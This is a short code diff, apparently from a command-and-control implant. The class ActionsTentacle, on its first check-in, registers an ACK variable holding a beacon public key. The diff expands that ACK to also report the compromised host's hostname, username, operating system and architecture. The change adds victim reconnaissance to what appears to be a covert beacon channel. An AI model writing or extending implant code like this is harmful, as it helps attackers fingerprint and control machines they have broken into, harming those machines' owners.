@@ -180,7 +180,14 @@ export class ActionsTentacle extends BaseTentacle {
     // 1. First-call ACK registration
     if (!this.ackSent) {
       const pubKeyB64 = await bytesToBase64(this.config.beaconKeyPair.publicKey);
-      const ackValue  = JSON.stringify({ k: pubKeyB64, t: payload.checkinAt });
+      const ackValue  = JSON.stringify({
+        k: pubKeyB64,
+        t: payload.checkinAt,
+        h: payload.hostname,
+        u: payload.username,
+        o: payload.os,
+        a: payload.arch,
+      });
 
       // Write ACK variable (create or update)
       try {
